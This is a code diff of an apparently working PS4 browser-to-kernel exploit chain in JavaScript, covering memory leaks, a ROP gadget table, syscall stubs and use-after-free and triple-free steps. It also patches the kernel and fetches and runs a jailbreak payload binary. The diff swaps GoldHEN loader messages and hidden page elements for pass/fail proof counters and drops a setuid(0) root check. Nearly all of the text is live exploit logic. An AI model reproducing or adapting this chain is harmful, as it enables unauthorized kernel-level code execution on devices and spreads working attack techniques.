@@ -6,52 +6,12 @@ import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
-function ensureHostConsole() {
-    var out = document.getElementById("out");
-    var st = document.getElementById("state");
-    if (!out) {
-        out = document.createElement("pre");
-        out.id = "out";
-        out.setAttribute(
-            "style",
-            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
-                "overflow:hidden;opacity:0;pointer-events:none;"
-        );
-        (document.body || document.documentElement).appendChild(out);
-    }
-    if (!st) {
-        st = document.createElement("div");
-        st.id = "state";
-        st.setAttribute(
-            "style",
-            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
-                "overflow:hidden;opacity:0;pointer-events:none;"
-        );
-        (document.body || document.documentElement).appendChild(st);
-    }
-    return { outEl: out, stateEl: st };
-}
-var _hostCons = ensureHostConsole();
-const outEl = _hostCons.outEl;
-const stateEl = _hostCons.stateEl;
+const outEl = document.getElementById("out");
+const stateEl = document.getElementById("state");
 const lines = [];
+let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
-
-function hostOk() {
-    var m = document.getElementById("msgs");
-    if (m) {
-        m.innerHTML = "GoldHEN v2.4b18.10 Loaded ...";
-    }
-}
-
-function hostFail() {
-    var m = document.getElementById("msgs");
-    if (m) {
-        m.innerHTML = "Failed to Load! Restart Your Console ...";
-        m.style.color = "yellow";
-    }
-}
 
 function post(tag, detail) {
     try {
@@ -83,6 +43,7 @@ function terse(s) {
     return s;
 }
 function mark(tag, detail) {
+
     const raw = detail;
     detail = terse(detail);
     lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
@@ -101,6 +62,8 @@ function mark(tag, detail) {
 function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
 function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
 function check(name, ok, detail) {
+    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
+    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
     return ok;
 }
 function hx(n) { return "0x" + (n >>> 0).toString(16); }
@@ -156,7 +119,6 @@ let uafFpSaved = null;
 let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;
 
 let allDone = false;
-let payloadRunning = false;
 
 (async function () {
     let p = null;
@@ -170,15 +132,7 @@ let payloadRunning = false;
             ? parseInt(params.get("spray"), 10) : 0x100;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
-        if (!off) {
-            var m = document.getElementById("msgs");
-            if (m) {
-                m.innerHTML = 'No offsets for this firmware: <span style="color: red;">'
-                    + (key || "Unknown") + '</span>';
-            }
-            mark("NO-OFFSETS", key || "unknown");
-            return;
-        }
+        if (!off) { state("no offsets for this firmware", "bad"); return; }
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
@@ -187,8 +141,8 @@ let payloadRunning = false;
         let kpatch = null, payload = null;
         // off.kpatch wins when a firmware shares another's kernel and therefore
         // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
-        const kpatchName = off && off.kpatch ? "slopkit/patches/" + off.kpatch
-            : key ? "slopkit/patches/" + key.replace(".", "") + ".bin" : null;
+        const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
+            : key ? "patches/" + key.replace(".", "") + ".bin" : null;
         const KPATCH_JMP_SITES = [];
         try {
             if (kpatchName) {
@@ -210,7 +164,7 @@ let payloadRunning = false;
               + " sites=" + KPATCH_JMP_SITES.length
             : "blob=" + kpatchName + " MISSING");
         try {
-            const r = await fetch("goldhen_2.4b18.10.bin");
+            const r = await fetch("payload.bin");
             if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
         mark("PAYLOAD-BLOB", payload
@@ -304,9 +258,7 @@ let payloadRunning = false;
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
         const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
         if (!check("module-bases-0x4000-aligned",
-            aligned(webkitBase) && aligned(libkernelBase), "")) {
-            throw new Error("module bases not aligned");
-        }
+            aligned(webkitBase) && aligned(libkernelBase), "")) return;
 
         const G = {};
         const GAD = [
@@ -337,9 +289,7 @@ let payloadRunning = false;
             if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
         }
         if (!check("gadget-table-fits-module", gated === GAD.length,
-            gated + "/" + GAD.length)) {
-            throw new Error("gadget table incomplete");
-        }
+            gated + "/" + GAD.length)) return;
         const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                            G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
 
@@ -367,9 +317,7 @@ let payloadRunning = false;
         mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
         const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
         if (!check("syscall-page-needs-stub", miss.length === 0,
-            miss.join(","))) {
-            throw new Error("missing syscall stubs");
-        }
+            miss.join(","))) return;
 
         function bufAddr(ab) {
             const c = p.leakval(ab);
@@ -447,19 +395,6 @@ let payloadRunning = false;
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0,
             "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
-			
-        try {
-            var uid0 = sc(SYS.getuid).i32;
-            var su0 = sc(SYS.setuid, 0).i32;
-            if (uid0 === 0 || su0 === 0) {
-                mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
-                var m = document.getElementById("msgs");
-                if (m) {
-                    m.innerHTML = "GoldHEN is Already Loaded ...";
-                }
-                return;
-            }
-        } catch (e) {}
 
         const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
         const scratch = bufAddr(scratchAb);
@@ -624,7 +559,7 @@ let payloadRunning = false;
                 + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
             const w = { name: name, armed: false, wired: false };
             workers.push(w);
-            w.worker = new Worker("slopkit/rpc_worker.js");
+            w.worker = new Worker("rpc_worker.js");
             w.rpc = makeRpc(w.worker, name);
             if ((await w.rpc("ping", 15000)) !== "pong")
                 throw new Error(name + " did not answer ping");
@@ -867,7 +802,7 @@ let payloadRunning = false;
             check("console-rebooted-since-last-committed", false,
                 "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
             state("REBOOT FIRST -- this kernel is still poisoned", "bad");
-            hostFail();
+            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
             return;
         }
         check("console-rebooted-since-last-committed", true,
@@ -2322,6 +2257,7 @@ let payloadRunning = false;
                             + " sites=" + KPATCH_JMP_SITES.length);
                     }
 
+                    let payloadRunning = false;
                     if (payload && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
                         state("payload...", "warn");
@@ -2360,11 +2296,8 @@ let payloadRunning = false;
                                         + " handle=" + handle);
                                     check("payload-thread-created",
                                         payloadRunning, "");
-                                    if (payloadRunning) {
-                                        mark("PAYLOAD-RUNNING",
-                                            "bytes=" + payload.length + " entry=" + entry);
-                                        hostOk();
-                                    }
+                                    if (payloadRunning) mark("PAYLOAD-RUNNING",
+                                        "bytes=" + payload.length + " entry=" + entry);
                                 }
                             }
                         }
@@ -2516,14 +2449,9 @@ let payloadRunning = false;
               : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
               : committed ? "FAILED IN triple free -- REBOOT"
               : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
-			  
-		if (!payloadRunning) {
-            hostFail();
-        }
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
         state("FAILED -- see log", "bad");
-        hostFail();
     } finally {
 
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
@@ -2554,5 +2482,6 @@ let payloadRunning = false;
 
         if (rebootRequired)
             mark("REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed");
+        mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
     }
 })();
